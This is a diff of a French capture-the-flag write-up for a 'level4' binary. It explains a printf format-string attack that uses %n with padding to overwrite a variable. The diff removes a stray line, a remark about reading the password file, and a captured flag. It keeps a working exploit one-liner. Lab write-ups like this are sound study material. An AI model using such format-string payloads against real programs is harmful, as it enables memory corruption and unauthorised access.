@@ -39,15 +39,5 @@ iiiib7ff26b0 | bffff794 | b7fd0ff4 | 0 | 0 | bffff758 | 804848d | bffff550 | 200
 Notre buffer est donc affiche en 12 eme position, on peut donc mettre exploiter le 12 eme % de printf avec %n pour ecrire dans la variable m. Sauf que le nombre de caractere a ecrire est trop grand, donc on doit juste utiliser le %<number>d pour ecrire le nombre de caractere qu'on veut.
 
 ```python
-python -c 'print "\x10\x98\x04\x08"+"i"
-Wait what?!
-```
-
-On peut maintenant juste maintenir la connexion avec le shell et faire un cat sur le fichier contenant le mot de passe.
-
-```python
 python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4
-...
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
-...
 ```
